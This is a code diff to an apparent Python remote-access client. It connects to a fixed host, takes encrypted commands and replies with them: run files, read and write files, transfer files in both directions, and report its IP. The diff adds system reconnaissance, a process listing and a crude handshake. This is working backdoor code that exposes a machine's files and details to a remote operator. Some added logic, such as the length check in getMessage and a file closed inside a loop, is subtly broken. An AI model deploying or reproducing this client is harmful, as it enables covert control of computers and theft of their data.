@@ -3,6 +3,9 @@ import requests
 import os
 from Crypto.Cipher import AES
 import shutil
+import platform
+import psutil
+import random
 
 
 #secret_key = os.urandom(BLOCK_SIZE) i generated once and i will use that always
@@ -81,17 +84,16 @@ def executeFile(receiving_message):
         return sending_message       
 
 def readFile(con,receiving_message):
-    filename = receiving_message[5:]    
+    filename = receiving_message[5:]
+    
     if(os.path.exists(filename)):  
         try:
-            file = os.open(filename,os.O_RDWR)
-            print(receiving_message)
-            sending_message = os.read(file,os.stat(file).st_size).decode()
-        
+            file = open(os.getcwd()+"\\"+ filename,"r",encoding="ISO-8859-1")
+            sending_message = file.read()
+            file.close()
         except Exception as e:
             sending_message="Exception: " + str(e) 
         finally:
-            os.close(file)
             return sending_message
     else:
         return "File not found!"        
@@ -111,12 +113,12 @@ def writeToFile(con,received_message):
             file=open(filename, "a+")
             file.write(text+ "\n")
             sending_message = "Message written successfully."
+            file.close() 
             
-    
     except Exception as e:
         sending_message = str(e)
     finally:
-        file.close()    
+           
         return sending_message
 
 def makeDirectories(receiving_message):
@@ -184,6 +186,7 @@ def getFile(con,sending_message):
             print('data=%s', (data))
             total+=len(data)
             f.write(data)
+            f.close()
         return "done"
 
 def getIp():
@@ -194,32 +197,85 @@ def getIp():
     except Exception as e:
         sending_message = "Failed to get the ip. with error: " + str(e)
     return  sending_message
-    
+
+def getMessage(con):
+    # get the length of the incoming data
+    len_data = int(decryption(con.recv(1024)));
+    print("Data length ",len_data)
+    #start getting that data
+    received_message = decryption(con.recv(1024))
+    while len(received_message)<len_data:
+        if len(received_message)-len_data>1024:
+            received_message += decryption(con.recv(1024))
+        else:
+            received_message += decryption(con.recv(len(received_message)-len_data))
+    while received_message.endswith(" "):
+            received_message = received_message[:-1]
+    return received_message
+
+def infoMethod():
+    disk_partitions = psutil.disk_partitions(all=False)    
+    sending_message = platform.platform()+"\n"
+    sending_message +="CPU numbers %d \n" %(psutil.cpu_count())
+    sending_message += "%0.2f GiB RAM" %(psutil.virtual_memory().total/1024**3) +"\n"
+    for partition in disk_partitions:
+        usage = psutil.disk_usage(partition.mountpoint)
+        sending_message+=' %s device \n' %(partition.device)
+        sending_message+=' %s mountpoint \n' %(partition.mountpoint)
+        sending_message += '%s fstype \n' %(partition.fstype)
+        sending_message +='%s opts \n' %(partition.opts)
+        sending_message +="%0.2f Gb total \n" %(usage.total/1024**3)
+        sending_message +="%0.2f Gb used \n" %(usage.used/1024**3) 
+        sending_message +="%0.2f Gb free \n" %(usage.free/1024**3) 
+        sending_message +='percent used %s%s' %(usage.percent, "%")
+    return sending_message
+
+def processesMethod():
+    message = "PID\tCPU % \tMemory info\t name\n"
+    for proc in psutil.process_iter():
+       
+        try:
+            pinfo = proc.as_dict(attrs=['pid', 'name', 'cpu_percent', 'memory_info'])
+        except Exception as e:
+            message += (str(e))
+        else:
+        
+            message += str(pinfo['pid']) + '\t' + str(pinfo['cpu_percent']) + '\t' + str(pinfo['memory_info'][0])+ "    " + '\t' + str(pinfo['name'])+"\n"
+   
+    return message
+
+
+ 
+            
+            
+
 
 def client():
 
     #Creating the socket passing the ip and port as parameters and trying to connect
-    host = "192.168.2.8"
+    host = "192.168.2.7"
     port = 5000
     con = socket.socket()
     con.connect((host,port))
     received_message=""
+    #auth
+    auth_key = random.random()
+    con.send(encryption(padding(str(auth_key))))
+     
+    received_message = float(unpadding(decryption(con.recv(1024))))
+    print(received_message)
+    if(received_message!=auth_key*2):
+        con.close()
+        print("closing")
+    
     #Sending the first message with the ip of the client
     #makes the message a mulpiplier of 16 then encrypts it and sends it.
     con.send(encryption(padding(getIp())))
 
     
     while received_message != 'close_this_socket':
-        # get the length of the incoming data
-        len_data = int(decryption(con.recv(1024)));
-        print("Data length ",len_data)
-        #start getting that data
-        received_message = decryption(con.recv(1024))
-        while len(received_message)<len_data:
-            received_message += decryption(con.recv(1024))
-        while received_message.endswith(" "):
-                received_message = received_message[:-1]
-        print(received_message)
+        received_message = getMessage(con)
+        
         if received_message == "pwd":
            sending_message = getCurrentWorkingDirectory()
         elif received_message[0:2] == "cd":
@@ -242,21 +298,28 @@ def client():
            sending_message = makeDirectories(received_message)
         elif(received_message[0:8]=="download"):
            sending_message = sendFile(con,received_message)
+           received_message = getMessage(con)
         elif(received_message[0:6]=="upload"):
-           print("in upload")
            sending_message = getFile(con,received_message)
+           received_message = getMessage(con)
         elif(received_message=="ip"):
            sending_message = getIp()
+        elif(received_message=="info"):
+           sending_message = infoMethod()
+        elif(received_message=="processes"):
+           sending_message = processesMethod()
         else:
            sending_message = "use help"     
         
         
         #client send back data
+        print(sending_message)
         padded_message = padding(sending_message)
         print(" this is message len" ,len(padded_message))
         sending_message = encryption(padded_message)
         con.send(encryption(padding(str(len(sending_message)))))
         con.sendall(sending_message)
+        print("message send")
 
     con.close()    
         
